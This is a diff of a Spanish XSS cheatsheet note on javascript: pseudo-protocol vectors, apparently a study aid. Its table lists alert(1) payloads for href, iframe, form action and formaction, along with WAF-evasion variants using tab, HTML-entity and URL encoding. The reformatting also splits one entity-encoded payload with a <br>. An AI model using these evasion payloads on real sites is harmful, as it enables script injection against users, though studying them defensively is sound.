@@ -12,18 +12,20 @@ linked:
 # XSS - Pseudo-protocolos (javascript:)
 
 ***
-
+```
+<pre><code></code></pre>
+```
 ## Cheatsheet
 
-| **Vector / Atributo**          | **Payload de Ejemplo**                                                             | **Contexto y Explotación**                                                                                                                                                                   |
-| ------------------------------ | ---------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `href` en `<a>`                | `<a href="javascript:alert(1)">Click</a>`                                          | **Interactivo.** Requiere que la víctima haga clic en el enlace. Es el punto de inyección más común para este esquema.                                                                       |
-| `src` en `<iframe>`            | `<iframe src="javascript:alert(1)">`                                               | **Automático.** El script se ejecuta inmediatamente cuando el motor del navegador intenta cargar la fuente del marco en el [[DOM]].                                                          |
-| `action` en `<form>`           | `<form action="javascript:alert(1)"><button>Enviar</button></form>`                | **Interactivo.** La ejecución ocurre en el momento en que se envía el formulario, ya sea por acción del usuario o forzado mediante otro script.                                              |
-| `formaction` en `<button>`     | `<button formaction="javascript:alert(1)">Click</button>`                          | **Interactivo.** Atributo de HTML5 que permite a un botón sobrescribir la URI de destino (`action`) de su formulario contenedor.                                                             |
-| Evasión léxica (Espacios)      | `<a href="java&#x09;script:alert(1)">Click</a>`                                    | **Evasión.** Los navegadores ignoran tabulaciones (`&#x09;`), espacios o saltos de línea (`%0A`) insertados antes de los dos puntos del protocolo, rompiendo filtros de coincidencia exacta. |
-| Evasión vía Entidades HTML     | `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">` | **Evasión.** El contenido de los atributos se decodifica _antes_ de validarse como URL. Ofusca la palabra clave completa frente a un WAF.                                                    |
-| Ejecución con codificación URL | `<a href="javascript:%61%6c%65%72%74%28%31%29">Click</a>`                          | **Evasión.** Todo el bloque de código posterior a los dos puntos puede estar codificado en formato URL (URL encode) para evadir firmas de payloads conocidos.                                |
+|         **Vector / Atributo**          | **Payload de Ejemplo**                                                                             | **Contexto y Explotación**                                                                                                                                                                               |
+| :------------------------------------: | -------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+|        <br><br>`href` en `<a>`         | <br><br>`<a href="javascript:alert(1)">Click</a>`                                                  | <br>**Interactivo.** Requiere que la víctima haga clic en el enlace. Es el punto de inyección más común para este esquema.<br><br>                                                                       |
+|      <br><br>`src` en `<iframe>`       | <br><br>`<iframe src="javascript:alert(1)">`                                                       | <br>**Automático.** El script se ejecuta inmediatamente cuando el motor del navegador intenta cargar la fuente del marco en el [[DOM]].<br><br>                                                          |
+|      <br><br>`action` en `<form>`      | <br><br>`<form action="javascript:alert(1)"><button>Enviar</button></form>`                        | <br>**Interactivo.** La ejecución ocurre en el momento en que se envía el formulario, ya sea por acción del usuario o forzado mediante otro script.<br><br>                                              |
+|   <br><br>`formaction` en `<button>`   | <br><br>`<button formaction="javascript:alert(1)">Click</button>`                                  | <br>**Interactivo.** Atributo de HTML5 que permite a un botón sobrescribir la URI de destino (`action`) de su formulario contenedor.<br><br>                                                             |
+|   <br><br>Evasión léxica (Espacios)    | <br><br>`<a href="java&#x09;script:alert(1)">Click</a>`                                            | <br>**Evasión.** Los navegadores ignoran tabulaciones (`&#x09;`), espacios o saltos de línea (`%0A`) insertados antes de los dos puntos del protocolo, rompiendo filtros de coincidencia exacta.<br><br> |
+|   <br><br>Evasión vía Entidades HTML   | <br><br>`<a href="&#x6A;&#x61;&#x76;&#x61;&#x73<br><br>;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">` | <br>**Evasión.** El contenido de los atributos se decodifica _antes_ de validarse como URL. Ofusca la palabra clave completa frente a un WAF.<br><br>                                                    |
+| <br><br>Ejecución con codificación URL | <br><br>`<a href="javascript:%61%6c%65%72%74%28%31%29">Click</a>`                                  | <br>**Evasión.** Todo el bloque de código posterior a los dos puntos puede estar codificado en formato URL (URL encode) para evadir firmas de payloads conocidos.<br><br>                                |
 
 ### Inyección en Contextos de Navegación
 
